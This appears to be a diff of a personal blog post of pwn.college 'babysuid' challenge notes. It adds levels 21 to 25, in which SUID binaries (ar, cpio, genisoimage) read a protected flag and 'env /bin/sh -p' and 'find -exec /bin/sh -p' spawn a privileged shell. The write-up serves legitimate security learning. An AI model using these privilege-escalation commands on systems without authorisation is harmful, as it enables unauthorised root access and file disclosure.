@@ -1,20 +1,17 @@
 <!DOCTYPE html>
 <html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='ASU CSE 365 Program Misuse Program Interaction:Linux Command Line babysuid challenge init: we can use the Desktop or the Workspace(then change to the terminal) to operate.
-suid: Suid special permissions only apply to executable files, the function is that as long as the user has execute permissions on the file with Suid, then when the user executes the file, the file will be executed as the file owner, once the file is executed, the identity switch disappears.'><title>PwnCollege_Note</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='ASU CSE 365 Program Misuse Program Interaction:Linux Command Line babysuid challenge init: we can use the Desktop or the Workspace(then change to the terminal) to operate. suid: Suid special permissions only apply to executable files, the function is that as long as the user has execute permissions on the file with Suid, then when the user executes the file, the file will be executed as the file owner, once the'><title>PwnCollege_Note</title>
 
 <link rel='canonical' href='https://J-shiro.github.io/p/pwncollege_note/'>
 
 <link rel="stylesheet" href="/scss/style.min.ac77dcf8b111b51da39a92990f431923f210f3876d85798a2125667f96dc33a4.css"><meta property='og:title' content='PwnCollege_Note'>
-<meta property='og:description' content='ASU CSE 365 Program Misuse Program Interaction:Linux Command Line babysuid challenge init: we can use the Desktop or the Workspace(then change to the terminal) to operate.
-suid: Suid special permissions only apply to executable files, the function is that as long as the user has execute permissions on the file with Suid, then when the user executes the file, the file will be executed as the file owner, once the file is executed, the identity switch disappears.'>
+<meta property='og:description' content='ASU CSE 365 Program Misuse Program Interaction:Linux Command Line babysuid challenge init: we can use the Desktop or the Workspace(then change to the terminal) to operate. suid: Suid special permissions only apply to executable files, the function is that as long as the user has execute permissions on the file with Suid, then when the user executes the file, the file will be executed as the file owner, once the'>
 <meta property='og:url' content='https://J-shiro.github.io/p/pwncollege_note/'>
 <meta property='og:site_name' content='J-shiro&#39;s Blog'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2022-10-29T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-10-29T00:00:00&#43;00:00'/>
 <meta name="twitter:title" content="PwnCollege_Note">
-<meta name="twitter:description" content="ASU CSE 365 Program Misuse Program Interaction:Linux Command Line babysuid challenge init: we can use the Desktop or the Workspace(then change to the terminal) to operate.
-suid: Suid special permissions only apply to executable files, the function is that as long as the user has execute permissions on the file with Suid, then when the user executes the file, the file will be executed as the file owner, once the file is executed, the identity switch disappears.">
+<meta name="twitter:description" content="ASU CSE 365 Program Misuse Program Interaction:Linux Command Line babysuid challenge init: we can use the Desktop or the Workspace(then change to the terminal) to operate. suid: Suid special permissions only apply to executable files, the function is that as long as the user has execute permissions on the file with Suid, then when the user executes the file, the file will be executed as the file owner, once the">
     <link rel="shortcut icon" href="https://j-shiro.github.io/img/somebody.png" />
 
     </head>
@@ -335,7 +332,7 @@ suid: Suid special permissions only apply to executable files, the function is t
 
 
                 <time class="article-words">
-                    353 字
+                    549 字
                 </time>
             </div>
         
@@ -368,6 +365,7 @@ suid: Suid special permissions only apply to executable files, the function is t
 	
 	
 ></p>
+<p><strong>output</strong></p>
 <p>level 10：<strong>rev</strong>&mdash;&gt; Used to output each line of a file in reverse order of characters, that is, the first character is last and the last character is first.</p>
 <p>level 11: <strong>od</strong>&mdash;&gt; Octal, decimal, hex, ASCII dump</p>
 <div class="highlight"><div class="chroma">
@@ -451,6 +449,60 @@ suid: Suid special permissions only apply to executable files, the function is t
 </span></span><span class="line"><span class="cl">cat flag.tar.gz
 </span></span></code></pre></td></tr></table>
 </div>
+</div><p>level 21: <strong>ar</strong> &mdash;&gt; to create or modify a backup file</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ar rv flag.back flag
+</span></span><span class="line"><span class="cl">cat flag.back
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>level 22: <strong>cpio</strong>&mdash;&gt;used to backup file</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">cpio -o	回车	<span class="c1">#-o Create the archive (run in copy-out mode)</span>
+</span></span><span class="line"><span class="cl">flag
+</span></span><span class="line"><span class="cl">ctrl + D得到flag
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>level 23: <strong>genisoimage</strong>&mdash;&gt; used to create an ISO 9660 image file, the output is placed inside the ISO9660 file system binary format.</p>
+<p>the file is parsed, and some of its content is disclosed by the error messages, thus this might not be suitable to read arbitrary data.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">genisoimage -sort flag
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>execute other commands</strong></p>
+<p>It can be used to break out from restricted environments by spawning an interactive system shell</p>
+<p>level 24: <strong>env</strong>&mdash;&gt;show environment variables that already exists in the system and executes instructions in the defined environment</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">env /bin/sh -p <span class="c1">#getshell</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>level 25: <strong>find</strong>&mdash;&gt;used to find files in the specified directory</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">find . -exec /bin/sh -p <span class="se">\;</span>
+</span></span></code></pre></td></tr></table>
+</div>
 </div>
 </section>
 
@@ -527,7 +579,7 @@ suid: Suid special permissions only apply to executable files, the function is t
         
             
         
-        共 0.61k 字 · 共 3篇文章
+        共 0.80k 字 · 共 3篇文章
         <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
             <br />本站访客数<span id="busuanzi_value_site_uv"></span>人次---
